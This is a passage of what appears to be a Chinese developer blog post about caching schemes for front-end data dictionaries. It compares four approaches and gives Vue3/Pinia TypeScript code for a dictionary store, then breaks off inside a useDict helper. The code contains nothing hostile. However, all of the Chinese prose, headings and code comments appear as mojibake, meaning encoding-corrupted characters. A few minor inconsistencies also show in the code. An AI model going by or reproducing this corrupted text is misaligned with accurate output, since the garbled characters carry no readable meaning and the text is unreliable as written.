<p>æˆ‘è‡ªå·¥ä½œä»¥æ¥å‚ä¸è¿‡å¾ˆå¤šä¸ªé¡¹ç›®ï¼Œæ—¢æœ‰ä»é›¶å¼€å§‹æ­å»ºçš„ï¼Œä¹Ÿæœ‰æ¥æ‰‹ä»–äººé¡¹ç›®çš„ã€‚åœ¨å®è·µè¿‡ç¨‹ä¸­ï¼Œæˆ‘å‘ç°ä¸åŒé¡¹ç›®å¯¹å­—å…¸çš„å®ç°æ–¹å¼å„ä¸ç›¸åŒï¼Œä¸”å„æœ‰ä¾§é‡ã€‚ä¾‹å¦‚ï¼Œå¯¹äºé¡¹ç›®ä¸­çš„å­—å…¸åŸºæœ¬ä¸ä¼šå‘ç”Ÿå˜åŒ–çš„ï¼Œé¡¹ç›®é€šå¸¸ä¼šé‡‡ç”¨é¦–æ¬¡å…¨éƒ¨åŠ è½½åˆ°æœ¬åœ°ç¼“å­˜çš„æ–¹å¼ã€‚è¿™ç§æ–¹å¼èƒ½æ˜¾è‘—èŠ‚çœç½‘ç»œè¯·æ±‚æ¬¡æ•°ï¼Œæå‡ç³»ç»Ÿå“åº”é€Ÿåº¦ã€‚ç„¶è€Œï¼Œå¯¹äºé¡¹ç›®ä¸­çš„å­—å…¸ç»å¸¸å˜åŠ¨çš„ï¼Œé¡¹ç›®åˆ™ä¼šé‡‡ç”¨æŒ‰éœ€åŠ è½½çš„æ–¹å¼ï¼Œå³å“ªé‡Œéœ€è¦ä½¿ç”¨å­—å…¸å€¼ï¼Œå°±åœ¨å“ªé‡Œè¿›è¡ŒåŠ è½½ã€‚ä½†è¿™ç§æ–¹å¼ä¹Ÿå­˜åœ¨å¼Šç«¯ï¼Œå½“æŸä¸ªé¡µé¢éœ€è¦ä½¿ç”¨åå¤šä¸ªå­—å…¸å€¼æ—¶ï¼Œé¦–æ¬¡è¿›å…¥é¡µé¢ä¼šä¸€æ¬¡æ€§å‘å‡ºåå¤šä¸ªè¯·æ±‚æ¥è·å–è¿™äº›å­—å…¸å€¼ï¼Œå½±å“ç”¨æˆ·ä½“éªŒã€‚</p>
<h2 data-id="heading-1">å¸¸è§å­—å…¸æ–¹æ¡ˆå‰–æ</h2>
<p>åœ¨å½“ä¸‹ï¼Œæ•°æ®å­—å…¸çš„å®ç°æ–¹æ¡ˆä¸°å¯Œå¤šæ ·ï¼Œå„æœ‰ä¼˜åŠ£ã€‚ä¸‹é¢å°†è¯¦ç»†ä»‹ç»å‡ ç§å¸¸è§çš„æ–¹æ¡ˆï¼Œå¹¶åˆ†æå…¶ç‰¹ç‚¹ã€‚æˆ‘å°†è¯¦ç»†ä»‹ç»å‡ ç§å¸¸è§çš„æ–¹æ¡ˆï¼Œå¹¶æ·±å…¥å‰–æå…¶ç‰¹ç‚¹ã€‚è¿™å‡ ç§æ–¹æ¡ˆçš†æ˜¯æˆ‘é€šè¿‡å®è·µç²¾å¿ƒæ€»ç»“è€Œæ¥ï¼Œå…¶ä¸­æ–¹æ¡ˆå››çš„æ€è·¯æ˜¯ç”±<a href="https://juejin.cn/user/78820570050190" target="_blank" title="https://juejin.cn/user/78820570050190">æˆ‘ä¸çˆ±åƒé±¼å•¦</a>æä¾›ã€‚</p>
<h3 data-id="heading-2">æ–¹æ¡ˆä¸€ï¼šé¦–æ¬¡å…¨éƒ¨åŠ è½½åˆ°æœ¬åœ°è¿›è¡Œç¼“å­˜</h3>
<h4 data-id="heading-3">æ–¹æ¡ˆæè¿°</h4>
<p>ç³»ç»Ÿå¯åŠ¨æˆ–ç”¨æˆ·é¦–æ¬¡è®¿é—®æ—¶ï¼Œå°†æ‰€æœ‰å­—å…¸æ•°æ®ä¸€æ¬¡æ€§åŠ è½½åˆ°æœ¬åœ°ç¼“å­˜ä¸­ã€‚åç»­ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œç›´æ¥ä»ç¼“å­˜ä¸­è·å–æ‰€éœ€å­—å…¸æ•°æ®ï¼Œæ— éœ€å†æ¬¡å‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚ã€‚</p>
<h4 data-id="heading-4">ä¼˜ç‚¹</h4>
<ul>
<li><strong>è®¿é—®é€Ÿåº¦å¿«</strong>ï¼šåç»­è®¿é—®æ—¶ç›´æ¥ä»æœ¬åœ°ç¼“å­˜è¯»å–æ•°æ®ï¼Œæ— éœ€ç­‰å¾…ç½‘ç»œè¯·æ±‚ï¼Œå“åº”é€Ÿåº¦æå¿«ã€‚</li>
<li><strong>å‡å°‘ç½‘ç»œè¯·æ±‚</strong>ï¼šä¸€æ¬¡æ€§åŠ è½½åï¼Œåç»­ä½¿ç”¨æ— éœ€é¢‘ç¹å‘èµ·ç½‘ç»œè¯·æ±‚ï¼Œé™ä½äº†ç½‘ç»œå¼€é”€ã€‚</li>
<li><strong>ç½‘ç»œä¾èµ–å°</strong>ï¼šå³ä½¿åœ¨ç½‘ç»œä¸ç¨³å®šçš„æƒ…å†µä¸‹ï¼Œä¹Ÿèƒ½æ­£å¸¸ä½¿ç”¨å·²ç¼“å­˜çš„å­—å…¸æ•°æ®ï¼Œä¿è¯äº†ç³»ç»Ÿçš„ç¨³å®šæ€§ã€‚</li>
</ul>
<h4 data-id="heading-5">ç¼ºç‚¹</h4>
<ul>
<li><strong>é¦–æ¬¡åŠ è½½æ—¶é—´é•¿</strong>ï¼šè‹¥å­—å…¸æ•°æ®é‡è¾ƒå¤§ï¼Œé¦–æ¬¡åŠ è½½æ—¶å¯èƒ½éœ€è¦è¾ƒé•¿æ—¶é—´ï¼Œå½±å“ç”¨æˆ·ä½“éªŒã€‚</li>
<li><strong>å ç”¨å­˜å‚¨ç©ºé—´</strong>ï¼šå°†æ‰€æœ‰å­—å…¸æ•°æ®å­˜å‚¨åœ¨æœ¬åœ°ï¼Œä¼šå ç”¨è¾ƒå¤šçš„æœ¬åœ°å­˜å‚¨ç©ºé—´ï¼Œå°¤å…¶æ˜¯å½“å­—å…¸æ•°æ®é‡åºå¤§æ—¶ã€‚</li>
<li><strong>ç¼“å­˜æ›´æ–°å¤æ‚</strong>ï¼šè‹¥å­—å…¸æ•°æ®é¢‘ç¹æ›´æ–°ï¼Œéœ€è¦è®¾è®¡å¤æ‚çš„ç¼“å­˜åŒæ­¥å’Œæ›´æ–°æœºåˆ¶ï¼Œå¦åˆ™å®¹æ˜“å‡ºç°æ•°æ®ä¸ä¸€è‡´çš„é—®é¢˜ã€‚</li>
</ul>
<h3 data-id="heading-6">æ–¹æ¡ˆäºŒï¼šæŒ‰éœ€åŠ è½½ä¸ç¼“å­˜</h3>
<h4 data-id="heading-7">æ–¹æ¡ˆæè¿°</h4>
<p>å½“ç”¨æˆ·è§¦å‘ç‰¹å®šæ“ä½œï¼Œéœ€è¦ä½¿ç”¨å­—å…¸æ•°æ®æ—¶ï¼Œæ‰ä»åç«¯å®æ—¶åŠ è½½æ‰€éœ€æ•°æ®ï¼Œä¸”ä¸è¿›è¡Œæœ¬åœ°ç¼“å­˜ã€‚æ¯æ¬¡ä½¿ç”¨å­—å…¸æ•°æ®æ—¶ï¼Œéƒ½é‡æ–°ä»æœåŠ¡å™¨è·å–æœ€æ–°æ•°æ®ã€‚</p>
<h4 data-id="heading-8">ä¼˜ç‚¹</h4>
<ul>
<li><strong>èŠ‚çœå­˜å‚¨ç©ºé—´</strong>ï¼šä¸è¿›è¡Œæœ¬åœ°ç¼“å­˜ï¼ŒèŠ‚çœäº†æœ¬åœ°å­˜å‚¨ç©ºé—´ï¼Œå°¤å…¶é€‚ç”¨äºå­˜å‚¨èµ„æºæœ‰é™çš„è®¾å¤‡ã€‚</li>
<li><strong>æ•°æ®å®æ—¶æ€§é«˜</strong>ï¼šæ¯æ¬¡è·å–çš„æ•°æ®éƒ½æ˜¯æœ€æ–°çš„ï¼Œä¸å­˜åœ¨ç¼“å­˜æ•°æ®ä¸åç«¯ä¸ä¸€è‡´çš„é—®é¢˜ï¼Œä¿è¯äº†æ•°æ®çš„å‡†ç¡®æ€§ã€‚</li>
</ul>
<h4 data-id="heading-9">ç¼ºç‚¹</h4>
<ul>
<li><strong>ç½‘ç»œè¯·æ±‚é¢‘ç¹</strong>ï¼šæ¯æ¬¡ä½¿ç”¨éƒ½éœ€è¦å‘èµ·ç½‘ç»œè¯·æ±‚ï¼Œåœ¨ç½‘ç»œçŠ¶å†µä¸ä½³æ—¶ï¼Œä¼šå¯¼è‡´åŠ è½½æ—¶é—´å˜é•¿ï¼Œå½±å“ç”¨æˆ·ä½“éªŒã€‚</li>
<li><strong>å¢åŠ æœåŠ¡å™¨è´Ÿæ‹…</strong>ï¼šé¢‘ç¹çš„ç½‘ç»œè¯·æ±‚ä¼šå¢åŠ æœåŠ¡å™¨çš„è´Ÿæ‹…ï¼Œå°¤å…¶æ˜¯åœ¨é«˜å¹¶å‘åœºæ™¯ä¸‹ï¼Œå¯èƒ½å½±å“æœåŠ¡å™¨çš„æ€§èƒ½ã€‚</li>
</ul>
<h3 data-id="heading-10">æ–¹æ¡ˆä¸‰ï¼šé¦–æ¬¡æŒ‰éœ€åŠ è½½å¹¶ç¼“å­˜</h3>
<h4 data-id="heading-11">æ–¹æ¡ˆæè¿°</h4>
<p>ç”¨æˆ·é¦–æ¬¡è®¿é—®æŸä¸ªå­—å…¸æ•°æ®æ—¶ï¼Œä»åç«¯åŠ è½½è¯¥æ•°æ®å¹¶ç¼“å­˜åˆ°æœ¬åœ°ã€‚åç»­å†æ¬¡è®¿é—®è¯¥å­—å…¸æ•°æ®æ—¶ï¼Œç›´æ¥ä»ç¼“å­˜ä¸­è¯»å–ï¼Œæ— éœ€å†æ¬¡å‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚ã€‚</p>
<h4 data-id="heading-12">ä¼˜ç‚¹</h4>
<ul>
<li><strong>å‡å°‘ç½‘ç»œè¯·æ±‚</strong>ï¼šç»“åˆäº†å‰ä¸¤ç§æ–¹æ¡ˆçš„éƒ¨åˆ†ä¼˜ç‚¹ï¼Œæ—¢åœ¨ä¸€å®šç¨‹åº¦ä¸Šå‡å°‘äº†ç½‘ç»œè¯·æ±‚æ¬¡æ•°ï¼Œåˆä¸ä¼šä¸€æ¬¡æ€§åŠ è½½è¿‡å¤šæ•°æ®ã€‚</li>
<li><strong>èŠ‚çœå­˜å‚¨ç©ºé—´</strong>ï¼šç›¸è¾ƒäºé¦–æ¬¡å…¨éƒ¨åŠ è½½åˆ°æœ¬åœ°ç¼“å­˜çš„æ–¹å¼ï¼Œä¸ä¼šä¸€æ¬¡æ€§å ç”¨å¤§é‡æœ¬åœ°å­˜å‚¨ç©ºé—´ï¼ŒèŠ‚çœäº†éƒ¨åˆ†å­˜å‚¨èµ„æºã€‚</li>
</ul>
<h4 data-id="heading-13">ç¼ºç‚¹</h4>
<ul>
<li><strong>ç¼“å­˜ç®¡ç†å¤æ‚</strong>ï¼šéœ€è¦è®°å½•å“ªäº›æ•°æ®å·²ç¼“å­˜ï¼Œä»¥ä¾¿åç»­åˆ¤æ–­æ˜¯å¦éœ€è¦ä»ç¼“å­˜ä¸­è¯»å–æˆ–é‡æ–°åŠ è½½ï¼Œå¢åŠ äº†ç¼“å­˜ç®¡ç†çš„å¤æ‚åº¦ã€‚</li>
<li><strong>ç¼“å­˜å ç”¨é—®é¢˜</strong>ï¼šå¯¹äºä¸å¸¸ä½¿ç”¨çš„å­—å…¸æ•°æ®ï¼Œç¼“å­˜å¯èƒ½ä¼šå ç”¨ä¸å¿…è¦çš„å­˜å‚¨ç©ºé—´ï¼Œé€ æˆèµ„æºæµªè´¹ã€‚</li>
<li><strong>ç¼“å­˜æ›´æ–°éš¾é¢˜</strong>ï¼šåŒæ ·é¢ä¸´ç¼“å­˜æ›´æ–°çš„é—®é¢˜ï¼Œéœ€è¦è®¾è®¡åˆç†çš„ç¼“å­˜æ›´æ–°ç­–ç•¥ï¼Œä»¥ä¿è¯æ•°æ®çš„å‡†ç¡®æ€§å’Œä¸€è‡´æ€§ã€‚</li>
</ul>
<h3 data-id="heading-14">æ–¹æ¡ˆå››ï¼šæŒ‰éœ€åŠ è½½ + ç‰ˆæœ¬æ ¡éªŒæ›´æ–°ç¼“å­˜</h3>
<h4 data-id="heading-15">æ–¹æ¡ˆæè¿°</h4>
<p>ç”¨æˆ·æŒ‰éœ€å‘èµ·å­—å…¸æ•°æ®è¯·æ±‚ï¼Œé¦–æ¬¡è®¿é—®æŸä¸ªå­—å…¸æ•°æ®æ—¶ï¼Œä»åç«¯åŠ è½½å¹¶ç¼“å­˜åˆ°æœ¬åœ°ã€‚åœ¨åç«¯å“åº”å¤´ä¸­æºå¸¦è¯¥å­—å…¸æ•°æ®çš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œåç»­æ¯æ¬¡è¯·æ±‚è¯¥å­—å…¸æ•°æ®æ—¶ï¼Œå‰ç«¯å¯¹æ¯”æœ¬åœ°ç¼“å­˜çš„ç‰ˆæœ¬ä¿¡æ¯å’Œå“åº”å¤´ä¸­çš„ç‰ˆæœ¬ä¿¡æ¯ã€‚è‹¥ç‰ˆæœ¬ä¿¡æ¯ä¸ä¸€è‡´ï¼Œåˆ™æ¸…é™¤æœ¬åœ°ç¼“å­˜ä¸­å¯¹åº”çš„å­—å…¸æ•°æ®ï¼Œå¹¶é‡æ–°ä»åç«¯åŠ è½½æœ€æ–°æ•°æ®ï¼›è‹¥ç‰ˆæœ¬ä¿¡æ¯ä¸€è‡´ï¼Œåˆ™ç›´æ¥ä½¿ç”¨æœ¬åœ°ç¼“å­˜çš„æ•°æ®ã€‚</p>
<h4 data-id="heading-16">ä¼˜ç‚¹</h4>
<ul>
<li><strong>æ•°æ®å®æ—¶æ€§æœ‰ä¿éšœ</strong>ï¼šé€šè¿‡ç‰ˆæœ¬æ ¡éªŒæœºåˆ¶ï¼Œèƒ½å¤ŸåŠæ—¶è·å–åˆ°å­—å…¸æ•°æ®çš„æ›´æ–°ï¼Œç¡®ä¿å‰ç«¯ä½¿ç”¨çš„æ•°æ®ä¸åç«¯ä¿æŒä¸€è‡´ï¼Œé¿å…äº†å› ç¼“å­˜æ•°æ®æœªåŠæ—¶æ›´æ–°è€Œå¯¼è‡´çš„ä¸šåŠ¡é—®é¢˜ã€‚</li>
<li><strong>å‡å°‘ä¸å¿…è¦çš„ç½‘ç»œè¯·æ±‚</strong>ï¼šåœ¨å­—å…¸æ•°æ®æœªæ›´æ–°æ—¶ï¼Œç›´æ¥ä½¿ç”¨æœ¬åœ°ç¼“å­˜ï¼Œæ— éœ€å‘èµ·ç½‘ç»œè¯·æ±‚ï¼ŒèŠ‚çœäº†ç½‘ç»œå¸¦å®½å’ŒæœåŠ¡å™¨èµ„æºã€‚</li>
<li><strong>å¹³è¡¡å­˜å‚¨ä¸æ€§èƒ½</strong>ï¼šæ—¢ä¸ä¼šåƒé¦–æ¬¡å…¨éƒ¨åŠ è½½é‚£æ ·å ç”¨å¤§é‡æœ¬åœ°å­˜å‚¨ç©ºé—´ï¼Œåˆèƒ½åœ¨ä¸€å®šç¨‹åº¦ä¸Šå‡å°‘ç½‘ç»œè¯·æ±‚ï¼Œåœ¨å­˜å‚¨å’Œæ€§èƒ½ä¹‹é—´å–å¾—äº†è¾ƒå¥½çš„å¹³è¡¡ã€‚</li>
</ul>
<h4 data-id="heading-17">ç¼ºç‚¹</h4>
<ul>
<li><strong>ç‰ˆæœ¬ç®¡ç†å¤æ‚</strong>ï¼šåç«¯éœ€è¦ç»´æŠ¤å­—å…¸æ•°æ®çš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œå¹¶ä¸”è¦ç¡®ä¿ç‰ˆæœ¬å·çš„å‡†ç¡®æ€§å’Œå”¯ä¸€æ€§ï¼Œè¿™å¢åŠ äº†åç«¯å¼€å‘çš„å¤æ‚åº¦å’Œç»´æŠ¤æˆæœ¬ã€‚</li>
<li><strong>é¢å¤–å¼€é”€</strong>ï¼šæ¯æ¬¡è¯·æ±‚éƒ½éœ€è¦è¿›è¡Œç‰ˆæœ¬ä¿¡æ¯å¯¹æ¯”æ“ä½œï¼Œè™½ç„¶å¼€é”€è¾ƒå°ï¼Œä½†åœ¨é«˜å¹¶å‘åœºæ™¯ä¸‹ï¼Œå¯èƒ½ä¼šå¯¹ç³»ç»Ÿæ€§èƒ½äº§ç”Ÿä¸€å®šå½±å“ã€‚</li>
<li><strong>é¦–æ¬¡åŠ è½½ä½“éªŒ</strong>ï¼šé¦–æ¬¡åŠ è½½å­—å…¸æ•°æ®æ—¶ï¼Œä¾ç„¶éœ€è¦ä»åç«¯è·å–æ•°æ®ï¼Œè‹¥æ•°æ®é‡è¾ƒå¤§æˆ–ç½‘ç»œçŠ¶å†µä¸ä½³ï¼Œå¯èƒ½ä¼šå½±å“ç”¨æˆ·ä½“éªŒã€‚</li>
</ul>
<h3 data-id="heading-18">æ–¹æ¡ˆé€‰å‹å»ºè®®</h3>
<p>å»ºè®®æ ¹æ®é¡¹ç›®ç‰¹æ€§é€‰æ‹©æ–¹æ¡ˆï¼Œæ²¡æœ‰æœ€å¥½çš„æŠ€æœ¯æ–¹æ¡ˆï¼Œåªæœ‰æœ€é€‚åˆé¡¹ç›®çš„æŠ€æœ¯æ–¹æ¡ˆï¼š</p>
<ul>
<li><strong>å­—å…¸ç¨³å®šä¸”é‡å°</strong>ï¼šæ–¹æ¡ˆä¸€å…¨é‡ç¼“å­˜</li>
<li><strong>å­—å…¸é¢‘ç¹æ›´æ–°</strong>ï¼šæ–¹æ¡ˆå››ç‰ˆæœ¬æ ¡éªŒç¼“å­˜</li>
<li><strong>å­˜å‚¨æ•æ„Ÿåœºæ™¯</strong>ï¼šæ–¹æ¡ˆä¸‰æŒ‰éœ€ç¼“å­˜</li>
<li><strong>å®æ—¶æ€§è¦æ±‚æé«˜</strong>ï¼šæ–¹æ¡ˆäºŒæ— ç¼“å­˜æ–¹æ¡ˆ</li>
</ul>
<blockquote>
<p>psï¼šå¦‚æœå¤§å®¶æœ‰æ›´å¥½çš„æ–¹æ¡ˆï¼Œä¹Ÿå¯ä»¥åœ¨è¯„è®ºåŒºæå‡ºï¼Œè®©æˆ‘ä»¬å¤§å®¶ä¸€èµ·å­¦ä¹ æˆé•¿</p>
</blockquote>
<h2 data-id="heading-19">ä»£ç å®ç°ï¼ˆæ–¹æ¡ˆå››ï¼‰</h2>
<p>ä¸‹è¿°ä»£ç çš„å®ç°åŸºäºvue3+piniaï¼Œè¯¥ä»£ç å®ç°äº†ç»Ÿä¸€ç®¡ç†å…¨å±€å­—å…¸æ•°æ®ï¼Œæ”¯æŒæŒ‰éœ€åŠ è½½ã€ç¼“å­˜å¤ç”¨ã€ç‰ˆæœ¬æ§åˆ¶ã€åŠ¨æ€æ›´æ–°ã€æ‰¹é‡å¤„ç†å­—å…¸æ•°æ®ç­‰åŠŸèƒ½ã€‚</p>
<h3 data-id="heading-20">pinia storeçš„å®ç°</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { defineStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'pinia'</span>
<span class="hljs-keyword">import</span> { ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { getDictDetails, <span class="hljs-keyword">type</span> <span class="hljs-title class_">Details</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/api/system/dict'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useDictStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">'dict'</span>, <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// å­˜å‚¨å­—å…¸æ•°æ®ï¼Œé”®ä¸ºå­—å…¸åç§°ï¼Œå€¼ä¸ºå­—å…¸è¯¦æƒ…æ•°ç»„</span>
    <span class="hljs-keyword">const</span> dictData = ref&lt;<span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">Details</span>[]&gt;&gt;({})
    <span class="hljs-comment">// å­˜å‚¨å­—å…¸ç‰ˆæœ¬ä¿¡æ¯ï¼Œé”®ä¸ºå­—å…¸åç§°ï¼Œå€¼ä¸ºç‰ˆæœ¬å·</span>
    <span class="hljs-keyword">const</span> dictVersions = ref&lt;<span class="hljs-built_in">string</span>&gt;(<span class="hljs-string">''</span>)

    <span class="hljs-comment">/**
     * æ›´æ–°å­—å…¸ç‰ˆæœ¬ä¿¡æ¯
     * <span class="hljs-doctag">@param</span> version æ–°çš„å­—å…¸ç‰ˆæœ¬å·
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">updateDictVersion</span> = (<span class="hljs-params">version: <span class="hljs-built_in">string</span></span>) =&gt; {
        dictVersions.<span class="hljs-property">value</span> = version
    }

    <span class="hljs-comment">/**
     * è·å–å­—å…¸ç‰ˆæœ¬
     * <span class="hljs-doctag">@returns</span> å­—å…¸ç‰ˆæœ¬å·
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">getDictVersion</span> = (<span class="hljs-params"/>) =&gt; {
        <span class="hljs-keyword">return</span> dictVersions.<span class="hljs-property">value</span> || <span class="hljs-string">''</span>
    }

    <span class="hljs-comment">/**
     * åŠ è½½å­—å…¸æ•°æ®
     * <span class="hljs-doctag">@param</span> dictNames å­—å…¸åç§°æ•°ç»„
     * <span class="hljs-doctag">@returns</span> åŠ è½½çš„å­—å…¸æ•°æ®å¯¹è±¡
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">getDicts</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">dictNames: <span class="hljs-built_in">string</span>[]</span>) =&gt; {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(dictNames)) {
                <span class="hljs-keyword">return</span> {};
            }
            <span class="hljs-comment">// è¿‡æ»¤å¹¶å»é‡æœ‰æ•ˆå­—å…¸åç§°</span>
            <span class="hljs-keyword">const</span> uniqueNames = [...<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(dictNames.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">name</span> =&gt;</span> 
                <span class="hljs-keyword">typeof</span> name === <span class="hljs-string">'string'</span> &amp;&amp; name.<span class="hljs-title function_">trim</span>()
            ))];
            
            <span class="hljs-keyword">if</span> (uniqueNames.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
                <span class="hljs-keyword">return</span> {};
            }

            <span class="hljs-keyword">const</span> <span class="hljs-attr">result</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">Details</span>[]&gt; = {};
            <span class="hljs-keyword">const</span> <span class="hljs-attr">unloadedDicts</span>: <span class="hljs-built_in">string</span>[] = [];

            <span class="hljs-comment">// åˆ†ç¦»å·²åŠ è½½å’ŒæœªåŠ è½½çš„å­—å…¸</span>
            dictNames.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">name</span> =&gt;</span> {
                <span class="hljs-keyword">if</span> (dictData.<span class="hljs-property">value</span>[name]) {
                    result[name] = dictData.<span class="hljs-property">value</span>[name];
                } <span class="hljs-keyword">else</span> {
                    unloadedDicts.<span class="hljs-title function_">push</span>(name);
                }
            });

            <span class="hljs-comment">// å¦‚æœæœ‰æœªåŠ è½½çš„å­—å…¸ï¼Œä»æ¥å£è¯·æ±‚è·å–</span>
            <span class="hljs-keyword">if</span> (unloadedDicts.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
                <span class="hljs-keyword">const</span> { data } = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getDictDetails</span>(unloadedDicts);

                <span class="hljs-comment">// åˆå¹¶æ–°åŠ è½½çš„æ•°æ®åˆ°ç»“æœ</span>
                <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(result, data);

                <span class="hljs-comment">// æ›´æ–°å…¨å±€å­—å…¸ç¼“å­˜</span>
                <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(dictData.<span class="hljs-property">value</span>, data);
            }

            <span class="hljs-keyword">return</span> result;
        } <span class="hljs-keyword">catch</span> (error) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'åŠ è½½å­—å…¸æ•°æ®å¤±è´¥:'</span>, error);
            <span class="hljs-keyword">return</span> {};
        }
    };

    <span class="hljs-comment">/**
     * æ ¹æ®å­—å…¸åç§°è·å–å­—å…¸æ•°æ®
     * <span class="hljs-doctag">@param</span> name å­—å…¸åç§°
     * <span class="hljs-doctag">@returns</span> å­—å…¸è¯¦æƒ…æ•°ç»„
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">getDict</span> = (<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) =&gt; {
        <span class="hljs-keyword">return</span> dictData.<span class="hljs-property">value</span>[name] || []
    }

    <span class="hljs-comment">/**
     * æ ¹æ®å­—å…¸åç§°å’Œå€¼è·å–å­—å…¸æ ‡ç­¾
     * <span class="hljs-doctag">@param</span> name å­—å…¸åç§°
     * <span class="hljs-doctag">@param</span> value å­—å…¸å€¼
     * <span class="hljs-doctag">@returns</span> å­—å…¸æ ‡ç­¾
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">getDictLabel</span> = (<span class="hljs-params">name: <span class="hljs-built_in">string</span>, value: <span class="hljs-built_in">string</span></span>) =&gt; {
        <span class="hljs-keyword">const</span> dict = <span class="hljs-title function_">getDict</span>(name)
        <span class="hljs-keyword">const</span> item = dict.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">value</span> === value)
        <span class="hljs-keyword">return</span> item?.<span class="hljs-property">label</span> || <span class="hljs-string">''</span>
    }

    <span class="hljs-comment">/**
     * æ ¹æ®å­—å…¸åç§°å’Œæ ‡ç­¾è·å–å­—å…¸å€¼
     * <span class="hljs-doctag">@param</span> name å­—å…¸åç§°
     * <span class="hljs-doctag">@param</span> label å­—å…¸æ ‡ç­¾
     * <span class="hljs-doctag">@returns</span> å­—å…¸å€¼
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">getDictValue</span> = (<span class="hljs-params">name: <span class="hljs-built_in">string</span>, label: <span class="hljs-built_in">string</span></span>) =&gt; {
        <span class="hljs-keyword">const</span> dict = <span class="hljs-title function_">getDict</span>(name)
        <span class="hljs-keyword">const</span> item = dict.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">label</span> === label)
        <span class="hljs-keyword">return</span> item?.<span class="hljs-property">value</span> || <span class="hljs-string">''</span>
    }

    <span class="hljs-comment">/**
     * æ¸…é™¤æŒ‡å®šå­—å…¸æ•°æ®
     * <span class="hljs-doctag">@param</span> names å­—å…¸åç§°
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">clearDicts</span> = (<span class="hljs-params">names: <span class="hljs-built_in">string</span>[]</span>) =&gt; {
        names.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">name</span> =&gt;</span> {
            <span class="hljs-title function_">clearDict</span>(name)
        })
    }


    <span class="hljs-comment">/**
     * æ¸…é™¤æŒ‡å®šå­—å…¸æ•°æ®
     * <span class="hljs-doctag">@param</span> name å­—å…¸åç§°
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">clearDict</span> = (<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) =&gt; {
        <span class="hljs-keyword">delete</span> dictData.<span class="hljs-property">value</span>[name]
    }

    <span class="hljs-comment">/**
     * æ¸…é™¤æ‰€æœ‰å­—å…¸æ•°æ®
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">clearAllDict</span> = (<span class="hljs-params"/>) =&gt; {
        dictData.<span class="hljs-property">value</span> = {}
    }

    <span class="hljs-keyword">return</span> {
        dictData,
        updateDictVersion,
        getDictVersion,
        getDict,
        getDicts,
        getDictLabel,
        getDictValue,
        clearDict,
        clearDicts,
        clearAllDict
    }
})
</code></pre>
<h3 data-id="heading-21">useDict å®ç°</h3>
<p>ä¸ºç»„ä»¶æä¾›<strong>å­—å…¸æ•°æ®çš„ç»Ÿä¸€è®¿é—®å…¥å£</strong>ï¼Œå°è£…äº†å­—å…¸æ•°æ®çš„åˆå§‹åŒ–åŠ è½½ã€è¯¦æƒ…æŸ¥è¯¢ã€æ ‡ç­¾/å€¼è½¬æ¢ç­‰é«˜é¢‘æ“ä½œï¼Œç®€åŒ–ç»„ä»¶å±‚å¯¹å­—å…¸æ•°æ®çš„è°ƒç”¨é€»è¾‘ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { <span class="hljs-keyword">type</span> <span class="hljs-title class_">Details</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/api/system/dict'</span>
<span class="hljs-keyword">import</span> { useDictStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/store/dict'</span>

<span class="hljs-comment">// æ ¹æ®å­—å…¸å€¼çš„nameè·å–å­—å…¸è¯¦æƒ…</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">useDict</span> = (<span class="hljs-params">params: <span class="hljs-built_in">string</span>[] = []</span>) =&gt; {

  <span class="hljs-keyword">const</span> dict = ref&lt;<span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">Details</span>[]&gt;&gt;()
  <span class="hljs-keyword">const</span> dictStore = <span class="hljs-title function_">useDictStore</span>()

